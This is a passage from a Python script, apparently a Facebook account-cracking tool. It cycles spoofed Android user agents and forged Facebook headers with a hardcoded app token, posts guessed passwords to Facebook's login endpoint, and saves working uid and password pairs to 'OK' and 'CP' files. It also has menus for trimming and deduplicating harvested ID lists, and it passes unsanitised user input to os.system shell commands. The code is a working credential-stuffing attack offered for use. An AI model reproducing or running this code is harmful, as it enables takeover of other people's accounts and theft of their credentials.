Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 13; 22031116AI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android TV)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-31)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R116-15509.6.0)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2022) Build/S2STS32.71-105-3)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3624 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; T50_EEA Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10.0; 9212A Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 10; SNE-LX1 Build/HUAWEISNE-L21) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230505.002) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; MI CC9 Pro Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 10; CLT-L29 Build/HUAWEICLT-L29) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A326U Build/TP1A.220624.014) VD/236","Dalvik/2.1.0 (Linux; U; Android 9; moto g(7) supra Build/PCOS29.114-134-20) AppleWebKit [PB/111]","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-DQ54 Build/67.0.A.4.22)","Dalvik/2.1.0 (Linux; U; Android 10; LEM12Pro Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; U696CL Build/UMX_U696CL_V11.01.02.01)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; GHIA_A1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; Elite P55Max Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; trogdor Build/R115-15474.41.0)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO AD8 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; 2207117BPG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; SKY PAD8 Build/S00812)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 Build/T2TLS33.3-22-5-2)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA VH1 Build/QTG3.200305.006.S313)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g22 Build/STAS32.79-77-28-50-5)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-9)","Dalvik/2.1.0 (Linux; U; Android 10.1; R69 Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Pro Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLAS33.105-129-2)","Dalvik/2.1.0 (Linux; U; Android 13; SM-F711B Build/TP1A.220624.014) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; J101-EEA Build/RP1A.201105.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; SM-N976N Build/PQ3B.190801.06281541)","Dalvik/2.1.0 (Linux; U; Android 10; V88 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; tv175a Build/MHC19J)","Dalvik/2.1.0 (Linux; U; Android 10; W-K560-TVM Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; moto e32(s) Build/STBS32.36-101-3)","Dalvik/2.1.0 (Linux; U; Android 13; C33 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; 22011119UY Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; AI PONT Build/RTO2.230307.001)","Dalvik/2.1.0 (Linux; U; Android 11; dedede Build/R114-15437.57.0)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Max90 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; 21091116AI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 pro Build/T1SHS33.35-23-20-6)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; moto e20 Build/RONS31.267-94-3) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; MAR-LX1B Build/HUAWEIMAR-L21B) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-N910C Build/MMB29K) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; M8_4G Build/V5_20220714) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 7.1.2; KYV43 Build/1.010FO.39.a)","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) VD/236",
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': sim,
                'X-FB-SIM-HNI': sim,
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
            responce = requests.post('https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true',data=dataX,headers=headersX,allow_redirects=False).text
            responce_json = json.loads(responce)
            if 'session_key' in responce_json:
                #uid = responce_json['uid']
                if uid not in oks:
                    print(f'\r{green}[OK] {uid} | {pw} {white}')
                    open('/sdcard/OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
            elif responce_json['error']['code'] == 405:
                #uid = responce_json['error']['uid']
                if uid not in cps:
                    print(f'\r{rad}[CP] {uid} | {pw} {white}')
                    open('/sdcard/CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:print(e)
#______[ TOOLS FOR FILE ]______>>
def file_tool():
    logo()
    print(f"\t {green}[ File Crack Tools ] ")
    print(50*"-")
    print(f'{white}[{green}1{white}] Remove Used File Lines')
    print(f'{white}[{green}2{white}] Remove Dubble Link')
    print(f'{white}[{green}3{white}] Spearte Links form File')
    print(f'{white}[{green}0{white}] Back To Main Menu')
    print(50*"-")
    sawera = input(f'{white}[{rad}?{white}] Select : ')
    if sawera in ["1","01"]:
        used()
    elif sawera in ["2","02"]:
        remove_dub()
    elif sawera in ["3","03"]:
        saprate()
    elif sawera in ["0","00"]:
        FARAZ()
    else:
        print(f"{white}[{green}•{white}] select at least one option");time.sleep(3)
        FARAZ()
#______[ remove used file ]______>>
def used():
    logo()
    fileName = input(f'{white}[{green}>>{white}] Enter File Name : ')
    try:
        with open(fileName, 'r+') as fp:
            logo()
            print(f"{white}[{green}π{white}] how much lines you want to remove ")
            print(50*"-")
            print(f"{white}[{green}•{white}] Example 1000 , 2000 , 3000")
            print(50*"-")
            s = int(input(f'{white}[{rad}?{white}] Enter Line Number :\033[1;92m '))
            lines = fp.readlines()
            fp.seek(0)
            fp.truncate()
            fp.writelines(lines[s:])
            print(50*"-")
            print(f'{white}[{green}√{white}] Successfully Remove Lines');time.sleep(3)
            input(f"{white}[{green}÷{white}] Press Enter To back")
            FARAZ
    except:
        print(f'{white}[{rad}!{white}] File Not Found');time.sleep(3)
        FARAZ()
#______[ File Link Seprater]______>>
def saprate():
    logo()
    print('           \x1b[97m[\033[37;41m  L I N K S   M E N U   \033[0;m] ')
    try:
        limit = int(input(' HOW MANY LINKS DO YOU WANT TO SPRATE  >: '))
        print("")
        print("")
    except:
        limit = 1
    print('           \x1b[97m[\033[37;41m  S A P R A T E   M E N U   \033[0;m] ')
    print("")
    print('\033[1;32m PUT YOUR FILE FOR SPRATE')
    file_name = input('\033[1;33m FILE PATH: ')
    print("")
    print(" PUT YOUR NEW FILE NAME ")
    print('\033[1;32m Example /sdcard/BILLU-81.txt')
    new_save = input('\033[1;33m NEW FILE PATH: ')
    y = 0
    for k in range(limit):
        y += 1
        print("")
        print("")
        print('\033[1;32m EXAMPLE [100080],[100081] [100083] ETC  \033[0m')
        print("")
        links = input(' \033[1;33mPUT LINKS  %s:\033[1;32m ' % (y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*"-")
    print("")
    print('\033[1;33m LINKS GRABBED SUCCESSFULLY')
    print(' TOTAL GRABBED LINKS:\033[1;32m   ' +
          str(len(open(new_save).read().splitlines())))
    print('\033[1;33m NEW FILE SAVE AS: \033[1;32m  '+new_save)
    print(50*"-")
    print("")
    input('\033[1;32m PRESS ENTER TO BACK ')
    FARAZ()()
#______[ Dubble Link Remover ]______>>
def remove_dub():
    logo()
    print('           \x1b[97m[\033[37;41m  DUBBLE LINKS CUTTER MENU   \033[0;m] ')
    print(f"{white}[{green}+{white}] EXAMPLE : /sdcard/your_file_name.txt  \n\n")
    print("")
    Error = input(f"{white}[{green}+{white}] File Path '")
    print("")
    Error1 = input(f"{white}[{green}+{white}] NEW FILE SAVE AS : '")
    os.system('touch ' + Error)
    os.system('sort -r '+Error+' | uniq > '+Error1)
    print("")
    print("")
    print(50*"-")
    print("")
    print(f"{white}[{green}+{white}] REMOVING DUBBLE LINKS SUCCESSFULLY " + Error)
    print(f"{white}[{green}+{white}] NEW FILE SAVE AS : " + Error1)
    print(50*"-")
    print("")
    input('\033[1;32m PRESS ENTER TO BACK ')
    FARAZ()


if __name__=="__main__":
     FARAZ()
     #bapif("100034118766868|Faraz Ali ID",["4292416"],"2222")